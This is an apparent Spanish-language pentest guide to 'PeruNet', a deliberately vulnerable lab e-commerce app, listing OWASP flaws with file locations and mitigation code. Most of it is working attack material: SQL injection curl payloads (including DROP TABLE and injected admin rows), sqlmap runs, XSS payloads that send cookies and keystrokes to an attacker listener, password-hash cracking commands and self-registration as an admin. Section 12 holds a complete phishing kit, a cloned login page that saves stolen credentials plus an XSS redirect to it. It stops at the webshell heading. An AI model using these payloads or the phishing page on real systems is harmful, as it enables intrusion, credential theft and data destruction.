# PeruNet - Guía de Pentesting y Vulnerabilidades

> **Aplicación:** PeruNet (NewTec - Tienda de seguridad informática)
> **URL base:** `http://localhost/perunet` (o `http://192.168.x.x/perunet`)
> **Metodología:** OWASP Top 10
> **SO atacante:** Linux (Kali/Parrot/Ubuntu)

---

## Índice

1. [SQL Injection - Ordenar productos (A03)](#1-sql-injection---ordenar-productos-a03)
2. [SQL Injection - API Usuario (A03)](#2-sql-injection---api-usuario-a03)
3. [SQL Injection - Cupones (A03)](#3-sql-injection---cupones-a03)
4. [SQL Injection - Formulario de Contacto (A03)](#4-sql-injection---formulario-de-contacto-a03)
5. [Cross Site Scripting - XSS Stored (A03)](#5-cross-site-scripting---xss-stored-a03)
6. [IDOR - Acceso a compras de otros usuarios (A01)](#6-idor---acceso-a-compras-de-otros-usuarios-a01)
7. [Exposición de Datos Sensibles (A04)](#7-exposición-de-datos-sensibles-a04)
8. [Mass Assignment - Crear admin desde registro (A01)](#8-mass-assignment---crear-admin-desde-registro-a01)
9. [Open Redirect (A01)](#9-open-redirect-a01)
10. [Fuga de Información - phpinfo()](#10-fuga-de-información---phpinfo)
11. [Session Hijacking - httponly=false (A01/A07)](#11-session-hijacking---httponlyfalse)
12. [XSS Stored en Footer - Redirección a Login Falso (A03)](#12-xss-stored-en-footer---redirección-a-login-falso-a03)
13. [Resumen de Vulnerabilidades](#13-resumen-de-vulnerabilidades)
14. [File Upload - Webshell (A05)](#14-file-upload---webshell-a05)
15. [HTTP TRACE habilitado (A05)](#15-http-trace-habilitado-a05)
16. [Headers de seguridad faltantes (A05)](#16-headers-de-seguridad-faltantes-a05)

---

## 0. SQL Injection - Login de Administrador (A03) — NUEVO

### Descripción
El endpoint `POST /login` permite inyectar SQL a través del parámetro `email`. El valor se concatenó directamente en la consulta SQL dentro del método `findByEmail()` en `UsuarioModel.php`. Además, las contraseñas se almacenan con **MD5** (hash débil) en lugar de bcrypt.

### Archivo vulnerable
- `app/models/UsuarioModel.php:58-60` — concatenación directa en `WHERE u.correo = '$email'`

### Explotación desde Linux

```bash
# Login normal
curl -X POST "http://192.168.x.x/perunet/login" \
  -d "email=admin@perunet.com&password=admin123"

# SQLi - Time-based blind (detectar inyección)
curl -X POST "http://192.168.x.x/perunet/login" \
  -d "email=admin@perunet.com' AND SLEEP(5)-- -&password=x"

# SQLi - Error-based (extraer base de datos)
curl -X POST "http://192.168.x.x/perunet/login" \
  -d "email=admin@perunet.com' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE())))-- -&password=x"

# SQLi - UNION SELECT (extraer tablas)
curl -X POST "http://192.168.x.x/perunet/login" \
  -d "email=x' UNION SELECT 1,2,3,4,5,6,7,8,9 FROM information_schema.tables-- -&password=x"
```

### Automatización con sqlmap

```bash
# Capturar petición con Burp Suite o curl y guardar en inter.txt:
# POST /perunet/login HTTP/1.1
# Host: 192.168.x.x
# Content-Type: application/x-www-form-urlencoded
#
# email=test@test.com&password=test

sqlmap -r inter.txt --dbs --batch --random-agent

# También directo por URL
sqlmap -u "http://192.168.x.x/perunet/login" \
  --data="email=test@test.com&password=test" \
  --batch --dbs --level=3 --risk=2
```

### Mitigación
```php
$stmt = $this->db->prepare("SELECT u.*, r.nombre as rol FROM usuario as u
                            INNER JOIN rol as r ON u.id_rol = r.id_rol
                            WHERE u.correo = :correo AND u.estado = 'activo'");
$stmt->bindParam(':correo', $email);
$stmt->execute();
```

---

## 1. SQL Injection - Ordenar productos (A03)

### Descripción
El endpoint `/productos?busqueda=x&ordenar=` permite inyectar SQL a través del parámetro `ordenar`. El desarrollador concatenó directamente este valor en la cláusula `ORDER BY` confiando en que solo recibiría nombres de columna válidos.

### Archivo vulnerable
- `app/controllers/ProductosController.php:21-31` — pasa `$_GET['ordenar']` sin validar
- `app/models/ProductoModel.php:81-85` — concatenación directa en `ORDER BY`

### Explotación desde Linux

```bash
# Ordenar por precio (funcionamiento normal)
curl "http://192.168.x.x/perunet/productos?busqueda=teclado&ordenar=p.precio%20ASC"

# SQLi - Extraer datos con ORDER BY subquery
curl "http://192.168.x.x/perunet/productos?busqueda=x&ordenar=(SELECT%20contrasena%20FROM%20usuario%20WHERE%20id_rol=1%20LIMIT%201)"

# SQLi - Time-based blind
curl "http://192.168.x.x/perunet/productos?busqueda=x&ordenar=(SELECT%20CASE%20WHEN%20(SUBSTR((SELECT%20contrasena%20FROM%20usuario%20WHERE%20id_us=1),1,1)='$2a')%20THEN%20SLEEP(3)%20ELSE%20p.precio%20END)"

# SQLi con UNION en ORDER BY
curl "http://192.168.x.x/perunet/productos?busqueda=x&ordenar=p.precio%20DESC%20LIMIT%201%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13"
```

### Automatización con sqlmap

```bash
sqlmap -u "http://192.168.x.x/perunet/productos?busqueda=test&ordenar=1" \
  --batch --dump-all --level=3 --risk=2

# Time-based blind
sqlmap -u "http://192.168.x.x/perunet/productos?busqueda=x&ordenar=SLEEP(5)" \
  --batch --dbs --random-agent
```

### Mitigación
```php
$ordenesPermitidos = ['p.precio ASC', 'p.precio DESC', 'p.nombre ASC', 'p.nombre DESC'];
if (in_array($ordenar, $ordenesPermitidos)) {
    $sql .= " ORDER BY " . $ordenar;
} else {
    $sql .= " ORDER BY p.fecha_creacion DESC";
}
```

---

## 2. SQL Injection - API Usuario (A03)

### Descripción
Endpoint `/usuario/api/:id` expone datos de usuarios. El ID se concatenó directamente en la consulta SQL sin usar prepared statements. Además devuelve el **password hasheado** (MD5 — débil y fácil de crackear).

### Archivos vulnerables
- `app/controllers/UsuarioController.php:75-89` — método `apiUsuario()`

### Explotación desde Linux

```bash
# Obtener usuario por ID (funcionamiento normal)
curl "http://192.168.x.x/perunet/usuario/api/1"

# SQLi - Listar TODOS los usuarios
curl "http://192.168.x.x/perunet/usuario/api/1%20OR%201=1"

# UNION SELECT - Extraer estructura de tablas
curl "http://192.168.x.x/perunet/usuario/api/1%20UNION%20SELECT%20TABLE_NAME,2,3,4,5,6,7,8%20FROM%20INFORMATION_SCHEMA.TABLES"

# Obtener columnas de la tabla usuario
curl "http://192.168.x.x/perunet/usuario/api/1%20UNION%20SELECT%20COLUMN_NAME,2,3,4,5,6,7,8%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME='usuario'"

# Extraer password hash de admin
curl "http://192.168.x.x/perunet/usuario/api/1%20UNION%20SELECT%201,contrasena,3,4,5,6,7,8%20FROM%20usuario%20WHERE%20id_rol=1%20LIMIT%201"
```

### Automatización con sqlmap

```bash
sqlmap -u "http://192.168.x.x/perunet/usuario/api/1" \
  --batch --dump -T usuario

sqlmap -u "http://192.168.x.x/perunet/usuario/api/1" \
  --batch --dbs --random-agent --level=3 --risk=2
```

### Mitigación
```php
// 1. Prepared statements para prevenir SQLi
$stmt = $this->db->prepare("SELECT ... FROM usuario WHERE id_us = :id");
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();

// 2. Usar bcrypt en lugar de MD5
$hash = password_hash($password, PASSWORD_BCRYPT);
```

---

## 3. SQL Injection - Cupones (A03)

### Descripción
El endpoint `/carrito/cupon?codigo=` aplica un cupón de descuento. El código se concatenó directamente en la consulta SQL.

### Archivo vulnerable
- `app/controllers/CarritoController.php:53-68` — método `aplicarCupon()`

### Explotación desde Linux

```bash
# Cupón inválido (funcionamiento normal)
curl "http://192.168.x.x/perunet/carrito/cupon?codigo=DESCUENTO10"

# SQLi - Hacer que el cupón siempre sea válido
curl "http://192.168.x.x/perunet/carrito/cupon?codigo=x'%20OR%20'1'='1"

# SQLi - Extraer passwords con UNION SELECT
curl "http://192.168.x.x/perunet/carrito/cupon?codigo=x'%20UNION%20SELECT%201,contrasena,3%20FROM%20usuario%20LIMIT%201--%20-"

# SQLi - Modificar descuento a 100%
curl "http://192.168.x.x/perunet/carrito/cupon?codigo=x'%20UNION%20SELECT%201,'100','porcentaje'--%20-"
```

### Automatización con sqlmap

```bash
sqlmap -u "http://192.168.x.x/perunet/carrito/cupon?codigo=x" \
  --batch --dbs --random-agent --level=3 --risk=2

sqlmap -u "http://192.168.x.x/perunet/carrito/cupon?codigo=x" \
  --batch --dump-all --tamper=space2comment
```

### Mitigación
```php
$stmt = $this->db->prepare("SELECT * FROM cupon WHERE codigo = :codigo AND activo = 1");
$stmt->bindParam(':codigo', $codigo);
$stmt->execute();
```

---

## 4. SQL Injection - Formulario de Contacto (A03)

### Descripción
El formulario de contacto inserta los datos mediante concatenación directa en el INSERT. Todos los campos del formulario son vulnerables a SQLi.

### Archivo vulnerable
- `app/controllers/ContactoController.php:19-29` — método `enviar()`

### Explotación desde Linux

```bash
# Envío normal
curl -X POST "http://192.168.x.x/perunet/contacto" \
  -d "nombre=Juan&telefono=999999999&correo=juan@test.com&mensaje=Hola"

# SQLi - Insertar datos falsos en usuario
curl -X POST "http://192.168.x.x/perunet/contacto" \
  -d "nombre=test', 'Admin', 'hacker@evil.com', '\$2y\$10\$HashHash', '12345678', '999999999', 1, 'activo');-- -&telefono=1&correo=a@a.com&mensaje=test"

# SQLi - Borrar tabla cupon (si existe)
curl -X POST "http://192.168.x.x/perunet/contacto" \
  -d "nombre=x'; DROP TABLE IF EXISTS cupon;-- -&telefono=1&correo=a@a.com&mensaje=test"
```

### Automatización con sqlmap

```bash
# Capturar con Burp y guardar en contacto.txt, luego:
sqlmap -r contacto.txt --batch --dbs --random-agent

# O directo
sqlmap -u "http://192.168.x.x/perunet/contacto" \
  --data="nombre=test&telefono=999999999&correo=test@test.com&mensaje=test" \
  --batch --dbs --level=3 --risk=2
```

### Mitigación

```php
// Reemplazar concatenación directa por prepared statement
$stmt = $db->prepare("INSERT INTO contacto (nombre, telefono, correo, mensaje, fecha_creacion) 
                      VALUES (:nombre, :telefono, :correo, :mensaje, NOW())");
$stmt->bindParam(':nombre', $nombre);
$stmt->bindParam(':telefono', $telefono);
$stmt->bindParam(':correo', $correo);
$stmt->bindParam(':mensaje', $mensaje);
$stmt->execute();
```

Además, agregar validación de entrada:
```php
$nombre   = htmlspecialchars(trim($_POST['nombre']), ENT_QUOTES, 'UTF-8');
$telefono = preg_replace('/[^0-9+\- ]/', '', $_POST['telefono']);
$correo   = filter_var(trim($_POST['correo']), FILTER_SANITIZE_EMAIL);
$mensaje  = htmlspecialchars(trim($_POST['mensaje']), ENT_QUOTES, 'UTF-8');
```

---

## 5. Cross Site Scripting - XSS Stored (A03)

### Descripción
Los mensajes de contacto se guardan en la BD y se muestran en el panel admin **sin escapar**. Un atacante puede enviar un mensaje con JavaScript malicioso que se ejecutará cuando el admin vea los mensajes.

### Archivos vulnerables
- `app/controllers/ContactoController.php:37-57` — método `adminMensajes()` sin `htmlspecialchars()`

### Explotación desde Linux

```bash
# XSS básico
curl -X POST "http://192.168.x.x/perunet/contacto" \
  -d "nombre=<script>alert(1)</script>&telefono=999999999&correo=x@x.com&mensaje=test"

# Robar cookie del admin
curl -X POST "http://192.168.x.x/perunet/contacto" \
  -d "nombre=<img src=x onerror=\"fetch('http://TU_IP:8080/?cookie='+document.cookie)\">&telefono=999999999&correo=x@x.com&mensaje=test"

# Keylogger
curl -X POST "http://192.168.x.x/perunet/contacto" \
  -d "nombre=<script>document.onkeypress=function(e){fetch('http://TU_IP:8080/?k='+e.key)}</script>&telefono=999999999&correo=x@x.com&mensaje=test"

# Luego el admin debe visitar /admin/contacto/mensajes para gatillar el XSS
```

### Pasos para pentesting

```bash
# Terminal 1 - Listener
nc -lvnp 8080

# Terminal 2 - Inyectar payload
curl -X POST "http://192.168.x.x/perunet/contacto" \
  -d "nombre=<script>new Image().src='http://TU_IP:8080/?c='+document.cookie</script>&telefono=999999999&correo=x@x.com&mensaje=test"

# Visitar como admin el panel de mensajes
curl -v --cookie "perunet_session=COOKIE_ADMIN" \
  "http://192.168.x.x/perunet/admin/contacto/mensajes"
```

### Mitigación
```php
echo htmlspecialchars($m['nombre'], ENT_QUOTES, 'UTF-8');
```

---

## 6. IDOR - Acceso a compras de otros usuarios (A01)

### Descripción
Los endpoints `/usuarios/compra/:id` y `/usuarios/tracking/:id` no verifican que la venta pertenezca al usuario autenticado. Cualquier usuario autenticado puede ver comprobantes de OTROS usuarios cambiando el ID en la URL.

### Archivo vulnerable
- `app/controllers/UsuarioController.php:29-31` — se pasa `null` como usuarioId en `getDetalleById()`
- `app/models/VentaModel.php:116-125` — la condición `AND v.id_usuario = :usuarioId` se omite cuando es null

### Explotación desde Linux

```bash
# Obtener cookie primero (login como usuario normal)
# Sin IDOR, solo verías tu propia compra
curl -v --cookie "perunet_session=COOKIE_USUARIO" \
  "http://192.168.x.x/perunet/usuarios/compra/1"

# Probar IDs de otros usuarios
for id in 1 2 3 4 5; do
  echo "=== Venta ID: $id ==="
  curl -s --cookie "perunet_session=COOKIE_USUARIO" \
    "http://192.168.x.x/perunet/usuarios/compra/$id" | grep -oP 'cliente_nombre">[^<]+'
done
```

### Mitigación
```php
// En VentaModel.php
public function getDetalleById($id_venta, $usuarioId) {
    // Siempre filtrar por usuarioId, sin excepción
    $sql = "SELECT ... WHERE v.id_ven = :id_venta AND v.id_usuario = :usuarioId";
    // ...
}
```

---

## 7. Exposición de Datos Sensibles (A04)

### Descripción
Tres vectores exponen datos sensibles:

1. **API Usuario** (`/usuario/api/:id`) — devuelve `contrasena` (hash MD5 — débil), `dni`, `telefono`
2. **Exportación admin** (`/admin/usuarios/exportar`) — lista completa con passwords hasheados (MD5)
3. **Detalle de compra IDOR** — expone `dni`, `telefono`, `correo` de otros clientes

### Archivos vulnerables
- `app/controllers/UsuarioController.php:75-89` — `apiUsuario()`
- `app/controllers/UsuarioController.php:93-99` — `exportarUsuarios()`
- `app/models/VentaModel.php:107` — query expone datos del cliente

### Explotación desde Linux

```bash
# API pública - Obtener cualquier usuario
curl "http://192.168.x.x/perunet/usuario/api/1"

# Exportar todos los usuarios (admin)
curl -v --cookie "perunet_session=COOKIE_ADMIN" \
  "http://192.168.x.x/perunet/admin/usuarios/exportar"

# Extraer con grep los passwords hasheados (MD5)
curl -s "http://192.168.x.x/perunet/usuario/api/1" | grep -o '"contrasena":"[^"]*"'

# Crackear hash MD5 con Hashcat (-m 0 = MD5)
echo 'hash_md5_aqui' > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Crackear con John the Ripper
echo 'hash_md5_aqui' > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Identificar el tipo de hash
hashid '$1$rasmus$60LvD4x0FkBF0GxO01e7p/'
hash-identifier
```

### Mitigación
```php
// 1. Usar bcrypt en lugar de MD5
$hash = password_hash($password, PASSWORD_BCRYPT);

// 2. Ocultar campos sensibles en respuestas JSON
$hiddenFields = ['contrasena', 'codigo_verificacion'];
foreach ($usuarios as &$u) {
    foreach ($hiddenFields as $field) {
        unset($u[$field]);
    }
}
```

---

## 8. Mass Assignment - Crear admin desde registro (A01)

### Descripción
El endpoint `POST /registro` permite enviar el campo `id_rol=1` para crear un usuario con privilegios de administrador directamente. El desarrollador usó `$_POST['id_rol']` sin validación.

### Archivo vulnerable
- `app/controllers/AuthController.php:67` — `isset($_POST['id_rol']) ? (int)$_POST['id_rol'] : 2`

### Explotación desde Linux

```bash
# Registro normal (id_rol=2 por defecto)
curl -X POST "http://192.168.x.x/perunet/registro" \
  -d "nombre=hacker&apellidos=evil&correo=hacker@evil.com&dni=12345678&telefono=999999999&password=Password123"

# Registro con privilegios de ADMIN (id_rol=1)
curl -X POST "http://192.168.x.x/perunet/registro" \
  -d "nombre=adminhack&apellidos=evil&correo=adminhack@evil.com&dni=87654321&telefono=999999999&password=Hack12345&id_rol=1"

# Login como el admin creado
curl -v -X POST "http://192.168.x.x/perunet/login" \
  -d "email=adminhack@evil.com&password=Hack12345"

# Ahora tienes acceso completo a /admin
```

### Mitigación
```php
// NO usar directamente $_POST. Fijar el rol manualmente
$data['id_rol'] = 2; // Siempre usuario normal en registro
```

---

## 9. Open Redirect (A01)

### Descripción
El endpoint `/redirect?url=` redirige a cualquier URL sin validación. Puede usarse para phishing o para evadir filtros de seguridad.

### Archivo vulnerable
- `app/controllers/IndexController.php:46-50` — método `redirect()`

### Explotación desde Linux

```bash
# Redirección normal
curl -v "http://192.168.x.x/perunet/redirect?url=/perunet/productos"

# Redirección a sitio externo (phishing)
curl -v "http://192.168.x.x/perunet/redirect?url=https://evil.com"

# Bypass de filtros de URL
curl -v "http://192.168.x.x/perunet/redirect?url=//evil.com"
curl -v "http://192.168.x.x/perunet/redirect?url=file:///etc/passwd"
```

### Mitigación
```php
$dominioPermitido = parse_url(BASE_URL, PHP_URL_HOST);
$destino = parse_url($url, PHP_URL_HOST);
if ($destino && $destino !== $dominioPermitido) {
    die("Redirección no permitida");
}
```

---

## 10. Fuga de Información - phpinfo()

### Descripción
`phpinfo()` está accesible en `/phpinfo` sin autenticación. Expone configuración completa del servidor: rutas, extensiones, variables de entorno, configuración PHP.

### Archivo vulnerable
- `app/controllers/IndexController.php:53-56` — método `phpinfo()`

### Explotación desde Linux

```bash
# Obtener phpinfo completo
curl "http://192.168.x.x/perunet/phpinfo" | grep -i "document_root\|server_root\|php_version\|loaded_config"

# Buscar variables de entorno (posibles credenciales)
curl -s "http://192.168.x.x/perunet/phpinfo" | grep -i "env\|password\|secret\|key"

# Buscar rutas del servidor
curl -s "http://192.168.x.x/perunet/phpinfo" | grep -i "doc_root\|include_path\|extension_dir"
```

### Mitigación
```php
// ELIMINAR el método phpinfo y su ruta en producción
ini_set('display_errors', 0);
ini_set('expose_php', 'Off');
```

---

## 11. Session Hijacking - httponly=false (A01/A07)

### Descripción
La cookie de sesión no tiene la bandera `HttpOnly`, permitiendo que JavaScript malicioso (XSS) la lea mediante `document.cookie`. Combinado con XSS Stored del contacto, un atacante puede robar la cookie del admin.

### Archivo vulnerable
- `app/core/App.php:42` — `'httponly' => false`

### Explotación desde Linux

```bash
# 1. Iniciar listener
nc -lvnp 8080

# 2. Inyectar XSS que roba cookies via formulario de contacto
curl -X POST "http://192.168.x.x/perunet/contacto" \
  -d "nombre=<script>document.location='http://TU_IP:8080/?c='+document.cookie</script>&telefono=999999999&correo=x@x.com&mensaje=test"

# 3. Esperar a que admin visite /admin/contacto/mensajes
# 4. Usar la cookie robada
curl -v --cookie "perunet_session=COOKIE_ROBADA" \
  "http://192.168.x.x/perunet/admin"
```

### Mitigación
```php
session_set_cookie_params([
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

---

## 12. Phishing con Login Falso + XSS en Botón "Enviar Mensaje" (A03)

### Descripción
El botón **"ENVIAR MENSAJE"** de `/perunet/contacto` tiene un `onclick` que se lee desde la tabla `contacto` (campo `mensaje`) **sin escapar**. Un atacante inyecta una redirección via `POST /contacto`, y cualquier visitante que haga clic en el botón es redirigido a un **login falso** que captura sus credenciales.

### Archivos vulnerables
- `app/views/public/contacto.php:12` — `$btn_onclick = htmlspecialchars($aviso['mensaje'])` (htmlspecialchars NO mitiga XSS en onclick porque el browser decodifica entidades HTML antes de ejecutar JS)
- `app/views/public/contacto.php:52` — `onclick="<?= $btn_onclick ?>"` renderizado sin escapar
- `app/components/footer.php:16` — `<?= $raw_html ?>` renderizado como HTML directo

### Explotación desde Kali

#### PASO 3.1: CREAR EL LOGIN FALSO

```bash
cd ~/pentest/perunet/phishing

cat > ~/pentest/perunet/phishing/login_falso.php << 'PHPEOF'
<?php
// ============================================
// CAPTURAR CREDENCIALES
// ============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $fecha = date('Y-m-d H:i:s');
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

    $data = "[$fecha] IP: $ip | Email: $email | Password: $password | UA: $user_agent\n";
    file_put_contents('credenciales.txt', $data, FILE_APPEND);

    header('Location: http://192.168.100.12/perunet/login?error=session_expired');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Perunet - Inicio de Sesión</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .tech-gradient { background: linear-gradient(135deg, #d10000, #990000); }
        .tech-pattern {
            background-image: radial-gradient(circle, rgba(255,255,255,0.2) 1px, transparent 1px);
            background-size: 20px 20px;
            background-color: rgba(255,0,0,0.05);
        }
        .input-focus:focus { box-shadow: 0 0 0 3px rgba(209,0,0,0.3); }
    </style>
</head>
<body class="bg-red-50 min-h-screen flex items-center justify-center tech-pattern">
    <div class="max-w-md w-full mx-4">
        <div class="text-center mb-8">
            <img src="http://192.168.100.12/perunet/public/img/EMPRESA/p.png?v=3.0" alt="Logo Perunet" class="w-48 mx-auto mb-4">
        </div>
        <div class="bg-white rounded-xl shadow-2xl overflow-hidden">
            <div class="tech-gradient h-2"></div>
            <div class="p-8">
                <h2 class="text-2xl font-bold text-gray-800 mb-6 text-center">Iniciar Sesión</h2>
                <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative mb-4" role="alert">
                    <strong class="font-bold">Error:</strong>
                    <span class="block sm:inline">Sesión expirada. Por favor, inicie sesión nuevamente.</span>
                </div>
                <form method="POST" action="" class="space-y-6">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Correo Electrónico</label>
                        <div class="relative">
                            <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                <i class="fas fa-envelope text-gray-400"></i>
                            </div>
                            <input type="email" name="email" required
                                class="pl-10 w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent input-focus transition duration-200"
                                placeholder="tucorreo@ejemplo.com">
                        </div>
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-1">Contraseña</label>
                        <div class="relative">
                            <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                <i class="fas fa-lock text-gray-400"></i>
                            </div>
                            <input type="password" name="password" required
                                class="pl-10 w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-transparent input-focus transition duration-200"
                                placeholder="••••••••">
                        </div>
                    </div>
                    <div class="flex items-center justify-between">
                        <div class="flex items-center">
                            <input type="checkbox" class="h-4 w-4 text-red-600 focus:ring-red-500 border-gray-300 rounded">
                            <label class="ml-2 block text-sm text-gray-700">Recordarme</label>
                        </div>
                        <div class="text-sm">
                            <a href="#" class="font-medium text-red-600 hover:text-red-500">¿Olvidaste tu contraseña?</a>
                        </div>
                    </div>
                    <div>
                        <button type="submit" name="login"
                            class="w-full flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-sm text-sm font-medium text-white bg-red-600 hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 transition duration-200 transform hover:scale-[1.01]">
                            Ingresar
                        </button>
                    </div>
                </form>
                <div class="mt-6">
                    <div class="relative">
                        <div class="absolute inset-0 flex items-center">
                            <div class="w-full border-t border-gray-300"></div>
                        </div>
                        <div class="relative flex justify-center text-sm">
                            <span class="px-2 bg-white text-gray-500">¿No tienes una cuenta?</span>
                        </div>
                    </div>
                    <div class="mt-6">
                        <a href="http://192.168.100.12/perunet/registro"
                            class="w-full flex justify-center py-2 px-4 border border-gray-300 rounded-lg shadow-sm text-sm font-medium text-gray-700 bg-white hover:bg-gray-50 focus:outline-none transition duration-200">
                            Registrarse
                        </a>
                    </div>
                </div>
            </div>
            <div class="px-8 py-4 bg-gray-50 border-t border-gray-200 text-center">
                <p class="text-xs text-gray-500">
                    Al continuar, aceptas nuestros <a href="#" class="text-red-600 hover:text-red-500">Términos de Servicio</a> y <a href="#" class="text-red-600 hover:text-red-500">Política de Privacidad</a>.
                </p>
            </div>
        </div>
    </div>
</body>
</html>
PHPEOF
```

#### PASO 3.2: INICIAR EL SERVIDOR PARA LOGIN FALSO

```bash
# 1. Matar procesos anteriores en puerto 9090
sudo fuser -k 9090/tcp 2>/dev/null

# 2. Iniciar servidor con login falso
cd ~/pentest/perunet/phishing
php -S 0.0.0.0:9090 login_falso.php &

# 3. Verificar que funciona
curl -I "http://192.168.100.135:9090/"
```

#### PASO 3.3: REDIRIGIR AL LOGIN FALSO (XSS DE REDIRECCIÓN)

```bash
KALI_IP="192.168.100.135"
VICTIMA_IP="192.168.100.12"

# Usar comillas dobles en el JS para no romper el SQL
PAYLOAD='window.location.href="http://'${KALI_IP}':9090/"'

curl -X POST "http://${VICTIMA_IP}/perunet/contacto" \
  -d "nombre=x" \
  -d "telefono=999999999" \
  -d "correo=test@test.com" \
  -d "mensaje=${PAYLOAD}"
# Respuesta esperada: {"success":"Mensaje enviado correctamente"}
```

#### PASO 3.4: VÍCTIMA VISITA `/perunet/contacto`

Cuando la víctima abre `http://192.168.100.12/perunet/contacto` y hace clic en **"ENVIAR MENSAJE"**, el botón ejecuta el onclick inyectado y redirige a `http://192.168.100.135:9090/` (el login falso).

#### PASO 3.5: MONITOREAR CREDENCIALES ROBADAS

```bash
tail -f ~/pentest/perunet/phishing/credenciales.txt
```

Cada vez que una víctima ingresa sus credenciales en el login falso, se registra:
```
[2026-07-11 15:30:00] IP: 192.168.100.50 | Email: admin@perunet.com | Password: Admin123 | UA: Mozilla/5.0...
```

### Flujo completo del ataque

| Paso | Acción | Detalle |
|---|---|---|
| 1 | Atacante crea `login_falso.php` en Kali | Diseño idéntico al login real de Perunet |
| 2 | Inicia servidor PHP en puerto 9090 | `php -S 0.0.0.0:9090 login_falso.php` |
| 3 | Inyecta payload XSS via `POST /contacto` | `mensaje=window.location.href="http://KALI:9090/"` |
| 4 | Payload se guarda en `contacto.mensaje` (SQL sin escapar) | BD vulnerable |
| 5 | Víctima visita `/perunet/contacto` | El botón tiene el onclick malicioso |
| 6 | Víctima hace clic en "ENVIAR MENSAJE" | Redirige a `KALI:9090` (login falso) |
| 7 | Víctima ingresa email + contraseña | Se guardan en `credenciales.txt` |
| 8 | Redirige al login real con `?error=session_expired` | La víctima no sospecha |

### Mitigación

**Para el onclick del botón (contacto.php):**
No usar datos del usuario en atributos de eventos JavaScript. En su lugar, usar un evento manejador fijo:

```php
// En contacto.php - NO leer onclick de la BD
<button type="button"
    onclick="window.location.href='/perunet/login'"
    class="w-full bg-red-600 ...">ENVIAR MENSAJE</button>
```

**Para el footer (footer.php):**
```php
// Escapar la salida HTML
<?= htmlspecialchars($raw_html, ENT_QUOTES, 'UTF-8') ?>
```

**Para el formulario de contacto (ContactoController.php):**
```php
// Usar prepared statements en lugar de concatenación
$stmt = $db->prepare("INSERT INTO contacto (nombre, telefono, correo, mensaje, fecha_creacion) VALUES (:nombre, :telefono, :correo, :mensaje, NOW())");
$stmt->bindParam(':nombre', $nombre);
$stmt->bindParam(':telefono', $telefono);
$stmt->bindParam(':correo', $correo);
$stmt->bindParam(':mensaje', $mensaje);
$stmt->execute();
```

---

## 13. Resumen de Vulnerabilidades

| # | Vulnerabilidad | Severidad | Herramienta Usada | Evidencia | Estado |
|---|---|---|---|---|---|
| 1 | SQL Injection (4 vectores) | 🔴 CRÍTICO | SQLMap, curl, Sguil | Captura de extracción de datos | Sin corregir |
| 2 | XSS Stored | 🔴 CRÍTICO | curl, Burp, Sguil | Inyección en contacto | Sin corregir |
| 3 | File Upload (Webshell) | 🔴 CRÍTICO | Burp, curl, Sguil | Subida de shell.php.png | Sin corregir |
| 4 | IDOR | 🟠 ALTO | curl | Acceso a compras de otros | Sin corregir |
| 5 | Session Hijacking | 🔴 CRÍTICO | curl | Cookie sin HttpOnly | Sin corregir |
| 6 | Open Redirect | 🟡 MEDIO | curl | Redirección externa | Sin corregir |
| 7 | phpinfo() expuesto | 🟡 MEDIO | curl | Configuración del servidor | Sin corregir |
| 8 | Exposición de datos | 🟠 ALTO | curl | API usuario expuesta | Sin corregir |
| 9 | HTTP TRACE habilitado | 🟡 MEDIO | curl | Vulnerable a XST | Sin corregir |
| 10 | Headers de seguridad | 🟡 MEDIO | nikto | CSP, HSTS, etc. faltantes | Sin corregir |

### Mitigaciones por vulnerabilidad

| # | Mitigación |
|---|---|
| **1. SQLi** | Usar prepared statements en todos los queries (`bindParam`/`bindValue`). Validar whitelist en ORDER BY. Nunca concatenar input del usuario. |
| **2. XSS Stored** | Aplicar `htmlspecialchars($data, ENT_QUOTES, 'UTF-8')` en toda salida que provenga de la BD o del usuario. |
| **3. File Upload** | Validar extensión (whitelist: jpg,png,gif), validar MIME real, renombrar archivos, almacenar fuera del webroot. |
| **4. IDOR** | Verificar que el `id_usuario` de la sesión coincida con el dueño del recurso en cada consulta. |
| **5. Session Hijacking** | Configurar `httponly=true`, `secure=true`, `samesite=Strict` en `session_set_cookie_params()`. |
| **6. Open Redirect** | Validar que la URL destino pertenezca al mismo dominio usando `parse_url()`. |
| **7. phpinfo()** | Eliminar la ruta `/phpinfo` en producción y deshabilitar `display_errors`. |
| **8. Exposición datos** | No incluir `contrasena`, `dni`, `codigo_verificacion` en respuestas JSON/exportaciones. |
| **9. HTTP TRACE** | Deshabilitar método TRACE en Apache: `TraceEnable Off` en `httpd.conf`. |
| **10. Headers** | Agregar CSP, HSTS, X-Content-Type-Options, X-Frame-Options en `.htaccess` o `httpd.conf`. |

## 14. File Upload - Webshell (A05)

### Descripción
